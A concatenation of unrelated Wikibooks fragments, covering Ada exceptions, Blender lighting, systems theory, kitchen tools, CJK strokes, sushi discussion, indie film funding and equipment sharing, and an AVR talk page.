 -- {{Ada/2005}}
 {{Ada/kw|declare}}
    Valve_Failure : {{Ada/kw|exception}};
 {{Ada/kw|begin}}
   ...
   {{Ada/kw|raise}} Valve_Failure {{Ada/kw|with}} &quot;Failure while opening&quot;;
   ...
   {{Ada/kw|raise}} Valve_Failure {{Ada/kw|with}} &quot;Failure while closing&quot;;
   ...
 {{Ada/kw|exception}}
   {{Ada/kw|when}} Fail: Valve_Failure =&gt;
     Put (Exception_Message (Fail));
 {{Ada/kw|end}};

The {{Ada/package|Ada.Exceptions}} package also provides subprograms for saving exception occurrences and re-raising them.

Lighting, you say? Psshh. Just throw up one light source and let her run, right? 

Lighting is probably the most underestimated part of a scene by new 3D artists. Unlike real life, it’s actually quite easy to produce a uniformly well-lit, shadowless scene in Blender. But such scenes are usually pretty dull and boring. 

Far more interesting are ones with highlights drawing attention to some areas, and shadows in other areas, leading the viewer to wonder what they might conceal. If a picture tells a story, and a picture is worth a thousand words, then lighting is like the punctuation for those words, the pauses between sentences and the sudden dramatic changes of tone.

Extremely uniform lighting can even give the picture a “photoshopped” look, as though the artist took part of one picture and stuck it on top of another. Whereas even a little bit of shadowing of one object by another can reinforce the impression that they are very much three-dimensional objects with a definite spatial relationship to each other, located in the same scene.

The following tutorials will help you gain knowledge of the technical use of lights in your scenes.

== Order and Chaos ==

Systems exhibit behaviors. These behaviors are the result of the application of parameters for the system’s elements - the rules. The subsequent behavior is interpreted based on the knowledge of the current system and the anticipated results of various inputs and processes. 
When systems behave in the expected manner they are generally regarded as stable and thus, in order. The term “order” is not absolute, however. Generally, terms such as “stable”, “balanced” and “in order” are describing all known (considered) inputs and outputs of a system, and based on those factors alone, the system appears to be exhibiting the desired behaviors.
Order describes the history of a system or system segment. Order illustrates that a system has responded to a rule or rules that have made the system behave in a manner that is expected. Specific forms of order exist in many systems: homeostasis, autonomy and chaos. These forms of order describe the system’s inherent behavior and how fluctuations in a system can occur.
When systems respond to external forces by eventually returning to their starting points, they are considered homeostatic. An example of this form of order is in living systems. A population of animals supported by an island will, over time, maintain a certain number. An external disease, predator, or other force may diminish the number, but eventually the population will increase (all other forces being equal). If the population spikes, shortages in food will eventually lead to less animals. These natural laws work to create homeostatic order.
Systems do not require external forces to create fluctuations, though. Often, systems that maintain the same inputs and processes over time experience diminishing desired outputs due to entropy (see [[wikipedia:Entropy]]). Systems that produce ongoing fluctuations or change but follow an average output yield autonomy. Autonomy is best described as oscillation in a system over a period of time. Although this oscillation is not necessarily harmonic motion, it does tend to be around a general mean. A small change in the input parameters of homeostatic order can create autonomic order. If the system fluctuates further they can become unable to be predicted. Although this does not indicate system failure, the behavior suggests “deterministic unpredictability” – the concept that the same inputs generate different results. This unpredictability is often considered chaotic. The term “chaos” does not mean that the system is failing or will fail; rather it is a method of describing a system that can not be predicted will full certainty. Most often, systems are considered to be chaotic when the underlying rules are unknown, thus the results can not be known.
This, however, does not mean that unpredictable or complex output structured systems are chaotic. When there is no underlying rule that governs the unpredictable system it is considered to be non-deterministic. An example of a non-deterministic system is when a coin is flipped. Although the coin has only two sides, predicting which side will land face-up is quite difficult. There is no underlying rule that governs the coin flip, rather it is the interaction of several inputs: the force of the flip, the original position, friction of fingernails, wind speed and direction, height of the flip, rotational velocity, current gravity of the object on which the person is standing, etc. Unpredictability results from not considering, or being able to consider all of these factors. Over time we would normally assume that the number of coins flips would be about average for each side to land face-up, it is not a definite prediction. This system is not considered autonomic since it does not internally correct itself, nor does the low number of outputs available immediately make it a homeostatic environment.
Thus, chaotic systems can be considered to have a highly complex order, sometimes too complex to understand without the aid of analytical tools or complex mathematics. Most approaches to studying complex and chaotic systems involve understanding graphical plots of fractal nature, and bifurcation diagrams. These models illustrate very complex reoccurrences of outputs directly related to inputs. Hence, complex order occurs from chaotic systems.

      <comment>/* Holistic View */ Fixed typo</comment>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text xml:space="preserve">{{Systems Theory Page}}

== Holistic View ==

A holistic view of a system encompasses the complete, entire view of that system. Holism emphasizes that the state of a system must be assessed in its entirety and cannot be assessed through its independent member parts. Dividing a system into its separate parts is considered destructive to that system and single parts within a system should not be prioritized. Thus, holistic views define atomism to ultimately be a threat to the health of a system. Holism focuses on alleviating problems within a system by emphasizing on the system as a whole and understanding that member parts ultimately aggregate to create that whole.

== Currently ==

Today, many industries are integrating holistic practices into their management and operations. U.S. western medical practitioners as well as corporate leaders are becoming aware of the dangers of treating humans or complex corporations as entities made up of isolated, unrelated parts. Understanding the larger system and how individual parts contribute to that system is key. Leaders must grasp the paradigm that the “whole is more than the sum of its parts”. Understanding a complex system entails understanding that the whole can take on a behavior all its own. Understanding this independent behavior is key in holism. Powerful, effective decisions can be made once a holistic view of a system is acquired. Poor, inappropriate decisions can be derived when a limited view is acquired by assessing separate parts without regarding how those parts contribute to the whole. Management practices emphasizing holism seek to eliminate the risk of these poor decisions.

== The Goal ==

The goal of increasing holistic awareness allows leaders to create and implement successful management policies and is highlighted by the International Standards Organization for quality management. The ISO 9001 standard defines improved quality management in which acquiring complete, complex knowledge of an organization is essential in implementing effective management practices. Operations and structures within an organization must be enveloped into the full, complete system context. Pooling these critical definitions together must be done so that a sophisticated and complete, essential perspective of an organization's behavior is acquired. Implementing holistic practices within an organization improves the chances of bringing that system to a stable state. Decisions concerning only one isolated function within the system are never constructed using holistic management practices. Thus, unknown outcomes caused by an underestimation of thorough system behavior are eliminated. Without holistic principles, an entire system’s function can be threatened and ultimately the individual constituting parts can be put into peril.

== Places that use Holism ==

Holistic practices are critical within the IT industry as data networks and intelligent complete systems are designed and built. Viewing independent components of a communications network or intelligent system as stand-alone entities ultimately impacts the overall quality of that system. In networking, care is taken to view a LAN, MANET or WAN as an entire entity. Small iterative changes to parts of a network are not being considered in isolation such that the downstream or upstream impacts aren't anticipated. Seeing a data network as a whole living system increases the chances for success of a stable, reliable system. In building IT intelligent systems, comprised of interacting smaller software and hardware modules, retaining a systems view is necessary so that the complete product can be troubleshot and debugged successfully. Myopic views focusing only on a single subsystem, where the entire system performance is not considered, can create an unpredictable and unreliable final product. If a holistic view is retained by analysts building or maintaining IT systems, the chance for success of that IT system is more realistic. As the analysts' understanding of the entire system increases, he/she is more capable of initiating complex changes such that the global health of the system is protected.

== A Final Example ==

A final illustration of how holism is an immanent and essential theory is the current adaptation of our world to its new global economy. It is imperative that we understand how our global world operates and how we all participate within that entity. Gaining a global economy has been facilitated through readily available international travel and instant, personal communication. As international parties intermix, the world will grow into a very sophisticated and complex system. Retaining a concise and objective perspective of our world and understanding its complexity is critical. Powerful internal influences will begin to impact our global system’s behavior. Every individual is gaining the power to make a fuller impact on his environment and the ability to voice his opinion concerning the state of his world. As more individual voices and wills are exercised, the stability and balance of our global system will be harder to maintain. We must persistently understand our world with a holistic perspective to gain in depth awareness of its behavior as an independent entity. Gaining this holistic view is essential in understanding our future evolution.</text>

[[Image:Chopping Board.jpg|thumb|right|A wooden cutting board]]

A '''cutting board''' (also known as a '''chopping board''') is a kitchen utensil used as a protective surface on which to cut or slice things. Cutting boards are often made of wood, plastic or cork. Glass cutting boards are also available, and although easy to clean, may dull or damage a knife during use.

Sanitation of cutting boards is crucial in preventing cross contamination and food poisoning. Simply washing a cutting board after use is not sufficient to prevent the growth of bacteria. Boards and knives, regardless of the material from which constructed, must be sanitized after each use with a solution of bleach and water. It is also advisable to cut raw meat, especially poultry products on a separate board from cooked meat or other food items. Cork boards are naturally anti-bacterial and do not require the same kind of maintenance as a wood or plastic board.

To prevent a cutting board from moving or sliding during use, place a clean, slightly wet, kitchen or side towel between the counter and board.

The wood can be maintained with the addition of rubbing it down in mineral oil after washing, do not use vegetable oil as this can go rancid.

[[Image:RollingPin.jpg|thumb|right|RollingPin]]

A '''rolling pin''' is a long cylinder-shaped tool, often with handles on either end, used to roll out dough. Rolling pins can be made from wood, plastic, ceramic or marble.

In choosing a rolling pin, consider that:
*Handle connections may be impossible to properly clean.
*When refrigerated before use, ceramic and marble rolling pins help keep cold cookie dough from sticking.
*Ceramic and marble rolling pins are heavy, expensive, and fragile.
*Wood surfaces never really get clean.
*A wooden central rod, or wooden handles, may snap during use.</text>

      <text xml:space="preserve">The horizontal stroke is a very common stroke, going horizontally from left to right. It is found in some form in nearly every Korean letter, especially the vowels.

Examples of the horizontal stroke:
{| border
|'''C'''hinese characters || all the strokes of: 一 二 三 &lt;br&gt; the second and third strokes of 上 &lt;br&gt; the first stroke of the tree radical: 木、村、枚 &lt;br&gt; the last two strokes of the sun radical: 日、早、昔 &lt;br&gt; the last three strokes of the eye radical: 目、省、眠 &lt;br&gt; and so on
|-
|'''J'''apanese kana &lt;sup&gt;1&lt;/sup&gt; || Katakana: エ、オ、キ、ケ、コ、サ、チ、テ、ナ、ニ、ホ、モ、ユ、ヨ、ラ、ロ、ヲ
|-
|'''K'''orean jamo || ㄷ, ㅌ, ㄸ, ㄹ, ㅁ, ㅂ, ㅃ, ㅈ, ㅉ, ㅊ, ㅋ, ㅌ, ㅍ, ㅎ, ㅏ, ㅐ, ㅑ, ㅒ, ㅓ, ㅔ, ㅕ, ㅖ, ㅗ, ㅘ, ㅙ, ㅚ, ㅛ, ㅜ, ㅝ, ㅞ, ㅟ, ㅠ, ㅡ, ㅢ
|}
&lt;small&gt;&lt;sup&gt;1&lt;/sup&gt; It's harder to determine what a stroke is in hiragana, since hiragana is inherently cursive. Stroke-like shapes can be found in あ、お、き、け、さ、す、せ、た、ち、な、は、ほ、ま、む、も、よ、を.&lt;br&gt;&lt;/small&gt;

In general, a horizontal stroke is defined by the following properties:

# They slant upwards.
#* Theoretically, all horizontal strokes should slant upwards at a very slight angle.
# They start hard and end hard.
#* Horizontal strokes don't trail off. The instant before you lift your pencil / pen off the paper should be one where you're applying force onto the paper.
#* '''However''', there is a tendency where horizontal strokes '''do''' trail off, if they are on the left half of a character, is not joined by another stroke on the right end, and is the last stroke in that side of the character. This arises naturally, because the pen / pencil / brush goes on immediately to write the right side of the character without stopping. Also as a result of this, the stroke tends to point diagonally upwards, and straight.
# They may curve down at the end.
#* Like the dot stroke, this is mostly a consequence of the second point above. As you apply more and more force you tend to draw your hand closer to your body, hence curving the stroke downwards.
#* However, please don't overdo this. This feature should be a natural result of point 2 above. If you find yourself curving the stroke deliberately, then you're definitely overdoing it. If it doesn't curve, then leave it. Horizontal strokes don't need to curve &amp;mdash; this applies here even more than it does with the dot stroke.

Let's take a look at three examples, the Chinese character for &quot;three&quot;, the Japanese katakana ''ni'', and the Korean syllable for ''pa'':

[[Image:CJK 1-02-01.PNG]]

All of the strokes of &quot;three&quot;, all of the strokes of &quot;mi&quot;, and first, fourth, and last strokes for &quot;pi&quot; all show the properties of horizontal strokes.

To show a situation where the horizontal doesn't trail off, here are two Chinese characters, for &quot;bean&quot; and &quot;head&quot;, respectively.

[[Image:CJK 1-02-02.PNG]]

Note that the character &quot;bean&quot; is found on the left side of the character for &quot;head&quot;. The last stroke of &quot;bean&quot;, a horizontal stroke, is made to trail off and point up.

It should be made clearer which parts of this article are about sushi in Japan, and which are about sushi outside Japan.  Although I'm sure the California, Philadelphia, Kamikaze, etc. rolls have made it back to Japan as novelties, these are really only &quot;common&quot; in North America, as you might guess from their names....  Then again, maybe the wikibooks cookbook is supposed to be an American cookbook?

It's also pretty surprising to see that nigiri sushi is barely mentioned, that temaki and oshi sushi aren't mentioned at all, that sashimi is treated as a kind of nigiri sushi (!!!), and that wasabi and pickled ginger aren't mentioned at all.

:this is a cookbook, not the wikipedia article on sushi. I would love if someone contributed another recipe! [[User:Paolorausch|Paolorausch]] 2 Mar 2005

:It would also be nice for a little more history on sushi, instead of a tiny &quot;sushi originated like this&quot; then nothing else, including no talk of Edo-Mae sushi, which is very much reveared in Japan and influenced many of the modern styles of sushi, also sashimi should be a seperate section...its not a type of sushi!  Before I leave, from what i understand Cailfornia rolls have taken in Japan, though only in the smaller less traditional places.

==the sushi page needs to be split==
The sushi page is growing way too big. How should it be split? I think just leave a menu here, maybe with a table containing close-up pictures of the various major classes of sushi. See the [[Cookbook:Melon]] page for a layout idea. [[User:AlbertCahalan|AlbertCahalan]] 23:14, 14 May 2005 (UTC)
:I agree. I'd have seperate pages for the rice and each type of Sushi, all linked from here. [[User:David Johnson|David Johnson]] 16:21, 2 October 2005 (UTC)

== How does that work? ==

I hope the adjustments i made work for you all.  I wasn't able to find any good pictures (such as are on the melon page) that meet the copyright guidelines, but I set up the table so the pictures can be put in when appropriate ones can be found.

== Merge Request ==

&lt;s&gt;&lt;nowiki&gt;{{mergefrom|The Sushi Guide}}&lt;/nowiki&gt;&lt;/s&gt;

Please take what you think is worthwhile, then add a '''&lt;nowiki&gt;{{delete|content merged}}&lt;/nowiki&gt;''' tag in The Sushi Guide when you are through.  Thanks.  --[[User:Robert Horning|Rob Horning]] 14:03, 14 April 2006 (UTC)


== wtf? ==

If they want to just talk about sushi, but no recipes or anything about making it then put it on wikipedia. I'm amazed wikibooks kept it this long even if it doesn't have anything useful.</text>

If you are raising any kind of a large budget, you are unlikely to get it all from one source. 
A funding plan is a strategy for how to get the money.  Here is one funding plan:

# Total Budget: $25 million.
# Convince [[Wikipedia:Charlize Theron|Charlize Theron]] and [[Wikipedia:Brad Pitt|Brad Pitt]] to be in your film.
# Take to studio.

Admittedly, this is a longshot. More realistically, you will have thought about what money you can get from where, and how to go about obtaining it.  Your funding plan will have headers like &quot;UK tax break financing 15% of budget&quot; and &quot;Advance from US DVD distributor&quot;. You will then outline in the plan exactly how certain this money is as well as  what you need to do to receive it.

A completed funding plan with half of the money confirmed is a powerful way to leverage additional funding. There is no surer way of making investors feel comfortable than showing them that other investors feel comfortable.

For some specific ideas on raising funds via film grants, private investors, hedge funds, and other film financing sources visit the Film Funding Blog here: [http://www.film-funding.com Film Funding]

      <text xml:space="preserve">==Chili Con Soya==

This is a soya version of Chili con Carne.  It is cheaper than the meat version and won't upset your vegetarians on set.  This provides a lot of energy and is very warming - great for winter shoots!

The amounts below will feed a small crew of 15.  This is really easy to cook but takes about 1/2 a day on the stove so you need to be prepare it in advance - you can however freeze it and it always tastes better the second day!

===Ingredients===

* 10 tins kidney beans
* 1kg Soya mince (you can use any dried soya mince or Quorn)
* 5 large onions chopped
* 5 cloves of garlic 
* 300 grams tomato paste
* 30 tomatoes chopped (can use 10 tins of tomatoes but fresh is better)
* 5 chillies (use assorted chillies as the flavours blend well) - don't worry this is a mild version
* salt &amp; pepper &amp; assorted herbs to season

===Directions===

* Put a bit of oil in a large pot and fry onions until brown.  
* Add soya mince and fry it a little 
* Add garlic, chilies, tomatoes, tomato paste.  Turn down heat to 1 and leave to simmer without a lid (you want to reduce the tomato)
* Leave it simmering for about 6 hours, checking on it about every 20 minutes or so.
* Taste it!  Add salt, pepper, garlic and chilli till it tastes good (keep it mild even if you prefer it hotter).  Remember all the flavours will get stronger after it sits for the next couple of days
* Have a bowl with a good bread and butter!
* If your shoot is 2-3 days away refrigerate after it has cooled otherwise freeze it.

==Abstract==
Fairly early in many independent production company's lives a dilemma arises with regards to film equipment - should the company rent or buy?
&lt;table class=&quot;wiki&quot; border=&quot;1&quot; cellpadding=&quot;3&quot; cellspacing=&quot;0&quot;&gt;
&lt;tr class=&quot;wiki&quot;&gt;
&lt;td class=&quot;wiki&quot; colspan=&quot;2&quot; align=&quot;center&quot;&gt;Rental&lt;/td&gt;
&lt;td class=&quot;wiki&quot; colspan=&quot;2&quot; align=&quot;center&quot;&gt;Purchase&lt;/td&gt;
&lt;/tr&gt;
&lt;tr class=&quot;wiki&quot;&gt;
&lt;td class=&quot;wiki&quot; align=&quot;center&quot;&gt;Pro&lt;/td&gt;
&lt;td class=&quot;wiki&quot; align=&quot;center&quot;&gt;Con&lt;/td&gt;
&lt;td class=&quot;wiki&quot; align=&quot;center&quot;&gt;Pro&lt;/td&gt;
&lt;td class=&quot;wiki&quot; align=&quot;center&quot;&gt;Con&lt;/td&gt;
&lt;/tr&gt;
&lt;tr class=&quot;wiki&quot;&gt;
&lt;td class=&quot;wiki&quot; bgcolor=&quot;#80ff80&quot;&gt;Don't need to pay large
upfront costs.&lt;/td&gt;
&lt;td class=&quot;wiki&quot; bgcolor=&quot;#ff8080&quot;&gt;Gets expensive if you rent
often.&lt;/td&gt;
&lt;td class=&quot;wiki&quot; bgcolor=&quot;#80ff80&quot;&gt;You will tend to produce more.&lt;/td&gt;
&lt;td class=&quot;wiki&quot; bgcolor=&quot;#ff8080&quot;&gt;The equipment may often sit
idle.&lt;/td&gt;
&lt;/tr&gt;
&lt;tr class=&quot;wiki&quot;&gt;
&lt;td class=&quot;wiki&quot; bgcolor=&quot;#80ff80&quot;&gt;Always get the latest
equipment.&lt;/td&gt;
&lt;td class=&quot;wiki&quot; bgcolor=&quot;#ff8080&quot;&gt;You may not shoot as often.&lt;/td&gt;
&lt;td class=&quot;wiki&quot; bgcolor=&quot;#80ff80&quot;&gt;Will become very familiar with
the equipment.&lt;/td&gt;
&lt;td class=&quot;wiki&quot; bgcolor=&quot;#ff8080&quot;&gt;May become outdated.&lt;/td&gt;
&lt;/tr&gt;
&lt;tr class=&quot;wiki&quot;&gt;
&lt;td class=&quot;wiki&quot; bgcolor=&quot;#80ff80&quot;&gt;Don't need to store or
maintain equipment.&lt;/td&gt;
&lt;td class=&quot;wiki&quot; bgcolor=&quot;#ff8080&quot;&gt;Don't become as familiar with
the equipment.&lt;/td&gt;
&lt;td class=&quot;wiki&quot; bgcolor=&quot;#80ff80&quot;&gt;Total costs will be lower if
you use it often&lt;/td&gt;
&lt;td class=&quot;wiki&quot; bgcolor=&quot;#ff8080&quot;&gt;Expensive upfront costs.&lt;/td&gt;
&lt;/tr&gt;
&lt;tr class=&quot;wiki&quot;&gt;
&lt;td class=&quot;wiki&quot; bgcolor=&quot;#80ff80&quot;&gt;.&lt;/td&gt;
&lt;td class=&quot;wiki&quot; bgcolor=&quot;#ff8080&quot;&gt;.&lt;/td&gt;
&lt;td class=&quot;wiki&quot; bgcolor=&quot;#80ff80&quot;&gt;.&lt;/td&gt;
&lt;td class=&quot;wiki&quot; bgcolor=&quot;#ff8080&quot;&gt;Need to store and maintain the
equipment.&lt;/td&gt;
&lt;/tr&gt;
&lt;/table&gt;

Indy film and documentary makers need to be busier than their mainstream counterparts.  Producing films at lower cost with lower margins means one needs to stay active in order to turnover enough &quot;product&quot; to be a viable business.  This should make us more inclined toward the purchase of equipment but we are often deterred by hefty upfront costs and gear often sitting idle due to long development, pre- and post-production periods.

Some producers square the circle by purchasing equipment and renting it to other producers.  This can work but the cost of marketing the service, attendant management overheads, threat of damage and distraction from the core business make this a sub-optimal solution.

This paper proposes an alternate model - collective ownership alongside an innovative financing model.  Herein is a framework for a group of filmmakers or production companies to collectively purchase and share equipment.  The high cost of film equipment, the cyclic nature of film production, and the collaborative nature of the industry make it well suited to such a collective.

* [[Movie Making Manual/Equipment Timeshare Agreement|Equipment Timeshare Agreement]]
*[[Movie Making Manual/Sample Shooting Kit|Sample Shooting Kit]]

==Ebay Alternative==

Find a equipment that:
*Has been on the market for over a year
*Is being sold on ebay
*Has at least 10 bidders on it

Then put in the bid to buy it used. Most likely when you are done with it you can sell it back for roughly the same price you bought it for (used is used). 

The longer it has been on the market and the higher the number of bidders for the item, the higher the likelihood that you will be able to sell it at the same price. Save the text and the images from the auction so you can save effort when you decide to resell the item. Also, be sure to follow the typical best practices for ebay: check the seller rating, check shipping rate, etc.

This is the Draft Agreement fot the FilmEquipmentTimeshare

== Draft Agreement ==

=== Outline ===
* The Film Equipment Timeshare is a &quot;for mutual profit&quot; partnership the purpose of which is to enable members to pool resources and buy film-making equipment which the members then share.
* Each member will contribute an initial £X.00 to the partnership and pay an 1/5th X renewal fee each year.
{| border=&quot;1&quot; cellpadding=&quot;10&quot; cellspacing=&quot;2&quot;
|-
| colspan=&quot;2&quot; style=&quot;background:#f4f3ab;&quot; | 
There should be a buy in fee, this makes the members feel like owners making it more likely they will take good care of the equipment.  The actual amount (X) will depend on the aims of each particular partnership.  A collective wanting to make High Definition feature films will have a much higher buy in fee than a group whose members want to make gritty documentaries
|}
* There will be a minimum of 3 and a maximum of 12 members.
{| border=&quot;1&quot; cellpadding=&quot;10&quot; cellspacing=&quot;2&quot;
|-
| colspan=&quot;2&quot; style=&quot;background:#f4f3ab;&quot; | 
Fewer than 3 and you can make do with a far simpler arrangement than this structure. More than 12 and the group becomes unwieldy and leaves little equipment time for each member.  In this case Members would probably be better off renting.|}
|}
* Members can be individuals, companies, partnerships, etcetera.
* Members may choose to manage the partnership in-house or appoint an external management member.
{| border=&quot;1&quot; cellpadding=&quot;10&quot; cellspacing=&quot;2&quot;
| colspan=&quot;2&quot; style=&quot;background:#f4f3ab;&quot; | 
If a lot of these partnerships spring up there could conceivably be a central company/individual who looks after management of the diaries, the funds and equipment maintanence for all the projects.
|}
* If Members choose to manage the partnership themselves they should elect a treasurer, a diary keeper, and an equipment maintainer.  Members may hold more than one of these positions.

=== Purchase of Equipment ===
* Members should agree their aims and then assemble a list of equipment to meet those aims.
* Members can then purchase this equipment in any manner the partnership agrees.
{| border=&quot;1&quot; cellpadding=&quot;10&quot; cellspacing=&quot;2&quot;
| colspan=&quot;2&quot; style=&quot;background:#f4f3ab;&quot; | 
Paying up front is simplest but the partnership will have a revenue stream so it could quite coceivably buy equipment on credit or borrow money to buy additional equipment in advance.|}

=== Use of Equipment ===
* Each member is assigned 350/[number of members] days use per year.
* Members shall pay Y per day for actual usage of the kit
{| border=&quot;1&quot; cellpadding=&quot;10&quot; cellspacing=&quot;2&quot;
| colspan=&quot;2&quot; style=&quot;background:#f4f3ab;&quot; |
This sum should be an amount far far lower than a rental charges would be.  It is there to stop “just-in-case” bookings, provide for the repair and replacement of equipment, and to repay any loans or equipment purchased on credit.|}
* Each Member therefore guarantees to pay each year £Y times 350/[number of members] per year.
{| border=&quot;1&quot; cellpadding=&quot;10&quot; cellspacing=&quot;2&quot;
| colspan=&quot;2&quot; style=&quot;background:#f4f3ab;&quot; |
This guarantee may not be strictly necessary or could.  Perhaps a guarantee to rent for ½ the total days would be sufficient.|}
* 15 days each year are set aside for servicing of equipment or emergencies.
* Members should reserve equipment with the diary controller.  The diary should be available to all members at all times (preferably online) so they members can plan their projects.
* Equipment cannot be booked more than 1 year in advance.
* Members not using all their assigned days may allocate them to a &quot;pool&quot;/bulletin board where they may be purchased by another member.   
* Members will sign equipment over to themselves when collecting it from the previous user.  It is the accepting member's responsibility to cover any insurance excess for loss of or damage to the equipment while it is in his care. 

=== General ===
* The equipment shall be insured at all times
* Equipment cannot be lent or hired to 3rd parties

=== Governance ===
* New members need approval from a majority of existing members
* Members may sell on at any time: existing members have pre-emption rights but if not taken up any new member to be approved by a majority.
* General Meetings at least once per year immediately following the anniversary date of the partnership's formation, any two members can requisition an extraordinary general meeting.
* At General Meeting members will vote on rental levels, how much of the capital to disburse, how much to reinvest in new equipment and how much to leave in the partnership.

Feedback:  Re sound recorder. For digital video, this would seem to be redundant.  Direct input to the camera would do the trick.

&lt;td class=&quot;wiki&quot; bgcolor=&quot;#ea7575&quot;&gt;10 000&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
The &amp;pound;10 000 total cost would be before discounts. For this particular
kit 5 production companies could get it for the following prices:
* Buy in &amp;pound;500 apiece (produces &amp;pound;2500) &lt;/li&gt;
* Annual renewal &amp;pound;100 apiece (will produces &amp;pound;500/year)
* Daily rental fee &amp;pound;25 (should produce a minimum of
&amp;pound;5000/year) 

Assuming financing at around 10% and annual insurance costs of about 10% of
equipment value the equipment should be paid off in less than 2 years.

&lt;table class=&quot;wiki&quot; border=&quot;1&quot; cellpadding=&quot;3&quot; cellspacing=&quot;0&quot;&gt;
&lt;tr class=&quot;wiki&quot;&gt;
&lt;td class=&quot;wiki&quot; bgcolor=&quot;#f4f3ab&quot;&gt;This could be a bank loan or
vendor financing.&lt;/td&gt;
&lt;/tr&gt;
&lt;/table&gt;

Each company would have guaranteed use of the equipment for 50 days
per year more than enough to make at least 1 feature... 

This is just an example, these partnership are flexible. A partnership with HD cameras and HBB portadrive sound equipment will have generally
higher buy-in and fees whilst entry to a partnership aimed at documentaries could be the price of a good night out.

== Possible Merge? ==

Several other similar pages, such as [[8051]], [[The 8051 Microcontroller]], and [[PIC]] were all merged into the [[Embedded Systems]] book. Of course, all those other pages were very small stubs, or half-books, and were easy to say goodbye to. This book is a little more substantial, but suffers from the fact that it is only a single monolithic page, and isn't broken up into any kind of book format. I would like to suggest we merge this book into the [[Embedded Systems]] book as well, although I would like to hear from some contributers here before I put up the {{tl|mergeto}} template, and get the ball rolling. If people here would like to merge this book, I would personally take care of most of the work, and I would divide this information up into a more managable page hierarchy. --[[User:Whiteknight|Whiteknight]] &lt;sub&gt;[[User talk:Whiteknight|T]]&lt;/sub&gt;&lt;small&gt;[[Special:Contributions/Whiteknight|C]]&lt;/small&gt;&lt;sup&gt;[[Special:Emailuser/Whiteknight|E]]&lt;/sup&gt; 23:53, 17 November 2005 (UTC)

== External Memory Interface? ==
Could it be a good idea to add a topic on how to use the AVR's external memory interface (hardware and software wise)? If I knew how it worked I would be eager to help, but I can't find any information on what kind of SRAM and latch chip to use.

:I've taken notice of this article, and will be adding material, replacing ASCII art with images, and attempting to (justifiably) get rid of the rewrite tag at the top of the article. [[User:Pfagerburg|Pfagerburg]] 15:34, 25 July 2007 (UTC)

Rather than draw my own picture, I'll refer to you the &quot;External Memory Interface&quot; section of the datasheets for devices that can use external SRAM, e.g. the Mega162. [http://www.atmel.com/dyn/resources/prod_documents/doc2513.pdf]  The requirements for the latch are clearly described (a '573 or equivalent) as well as the connections of the various signals from the AVR to the SRAM. [[User:Pfagerburg|Pfagerburg]] ([[User talk:Pfagerburg|talk]]) 20:51, 6 February 2008 (UTC)

== Working on the article ==
Here are my plans to improve the article so that the &quot;needs improvement&quot; tag can be legitimately removed.
*&lt;s&gt;Remove (!!!) where it shows up, after considering the text and possibly changing it&lt;/s&gt;
*&lt;s&gt;Rewrite description of interrupts.&lt;/s&gt;
*&lt;s&gt;Minor editing to GPIO section&lt;/s&gt; &lt;small&gt;Not so minor after all.&lt;/small&gt;
*&lt;s&gt;Replace ASCII art with a proper drawing in RS-232 section&lt;/s&gt;
*&lt;s&gt;Add explanation of &quot;true&quot; SPI and hardware-assisted like the USI (Universial Serial Interface) found on some of the AVR's, e.g. Tiny26.&lt;/s&gt;
*&lt;s&gt;Protocol issues section might need to be removed entirely.&lt;/s&gt;
*&lt;s&gt;JTAG section needs some parenthetical comments removed.&lt;/s&gt;
*&lt;s&gt;JTAGICE mkII section contains links to several development boards; these need to go into a separate section.&lt;/s&gt;
*&lt;s&gt;JTAGICE references in section 10 (AVR selection) may need to move up to section 8 (debugging interfaces).&lt;/s&gt;
*&lt;s&gt;&quot;AVR Selection&quot; section needs some reorganization.&lt;/s&gt;
*&lt;s&gt;&quot;Firmware Programming&quot; section needs an introduction, possibly some reorganization.  Might also want to look for dead links.&lt;/s&gt;
*&lt;s&gt;&quot;Programmer Tools&quot; is a link farm and FAQ, needs cleanup.  Some of it (AVRDude) might move up to the in-system programming section.&lt;/s&gt;
*&lt;s&gt;Make &quot;References&quot; its own section.&lt;/s&gt;
*&lt;s&gt;Add a quick overview before section 1 (&quot;Memory&quot;), probably just borrow heavily from the Wikipedia article.&lt;/s&gt;
*&lt;s&gt;Add circuit diagram for using external memory, per request on the talk page.&lt;/s&gt;
*&lt;s&gt;Add drawing/SPI block diagram to SPI section.&lt;/s&gt; &lt;small&gt;Datasheets have much better diagrams; point there.&lt;/small&gt;
*&lt;s&gt;&quot;References&quot; is a link farm, needs a lot of cleanup.  Some should move up to other sections where particular tools are mentioned.&lt;/s&gt;
*&lt;s&gt;The Timer/Counter section needs clean-up&lt;/s&gt;
**&lt;s&gt;There are several variants of timers on the AVR, 8-bit, 16-bit, PWM, high-speed, and these are not adequately explained.&lt;/s&gt; &lt;small&gt;Could use more explanations, but at least there's something there now.&lt;/small&gt;
**&lt;s&gt;Timer1 is not always a 16-bit timer.&lt;/s&gt;
**&lt;s&gt;There was an image that was removed for being unlicensed, needs to be replaced, but what was the image so I know what to replace it with?&lt;/s&gt; &lt;small&gt;The image didn't add much, and is in all the datasheets anyway&lt;/small&gt;
*&lt;s&gt;Fix the &lt;nowiki&gt;{{fact}}&lt;/nowiki&gt; in the JTAG section one way or the other.&lt;/s&gt;
*&lt;s&gt;Final scan for ?!?, TBD/TODO, etc.'s, ...'s and other signs of needed clean-up.&lt;/s&gt;
*&lt;s&gt;Remove clean-up tag.&lt;/s&gt;

I'll be working through the article from start to finish.  I'm sure there's more than just this list.  I appreciate the efforts of the folks who created this section, and hope that my edits will add to the quality and make it even more useful to other readers. [[User:Pfagerburg|Pfagerburg]] 17:22, 2 August 2007 (UTC)

:It's done.  Sort of.  The article can always use improvement (and I will continue working on it), but I feel that I have it to a place where it doesn't need the clean-up tag any longer. [[User:Pfagerburg|Pfagerburg]] ([[User talk:Pfagerburg|talk]]) 23:28, 13 March 2008 (UTC)

=== AVR Butterfly Demo Board ===
I [http://en.wikibooks.org/w/index.php?title=Embedded_Systems/Atmel_AVR&amp;diff=prev&amp;oldid=1098328 re-worded] the [[Atmel_AVR#Butterfly_Demo_Board|Butterfly Demo Board]] section, specifically mentioning the company that designed the board.  I removed the link to smileymicros.com, since they sell the board, but did not design it.  I realize that this promotes Ecros over Smiley (since both sell the board), but I think this is unavoidable.  If, for every protoboard and development tool listed, we have to have a link to every vendor that sells it, things get messy very fast.

